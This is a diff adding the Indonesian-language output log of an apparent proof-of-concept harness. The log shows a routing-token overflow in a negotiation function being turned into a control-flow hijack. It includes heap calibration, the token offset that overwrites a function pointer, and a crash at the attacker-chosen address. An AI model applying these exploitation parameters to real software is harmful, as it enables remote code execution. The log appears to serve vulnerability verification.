@@ -1,0 +1,13 @@
+harness rantai — overflow nego → control-flow hijack (kalibrasi diri, 2 lintasan)
+  target kanonik=0x0000414141414141 (kanonik: ya)
+  [kalibrasi] pasangan #2 A=0x559bea4a0620 B=0x559bea4a0830 selisih=528
+  [kalibrasi] payload korban (24 B): 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 
+  [kalibrasi] penggaris mulai di payload[0] (nilai 0x06) ⇒ token[517] → B[0]  ⇒  field `fn` ⊂ token[525]
+  [kalibrasi] byte target nanti di token[525]: 0x0000414141414141
+  [hijack] pasangan #1 A=0x559bea49cc10 B=0x559bea49ce20 selisih=528
+  RoutingTokenLength=600 disuntik; memanggil nego_send_negotiation_request
+  setelah overflow: korban canary=0x0000414141414141 fn=0x0000414141414141 tail=0x0000414141414141
+  korban tertimpa dengan alamat pilihan kita → memanggil pointer itu
+  SINYAL 11: alamat fault = 0x0000414141414141 (diinginkan 0x0000414141414141)
+  HIJACK TERBUKTI: pc diarahkan ke alamat yang kita tanam di token
+VERDICT: TERBUKTI — overflow menjadi control-flow hijack
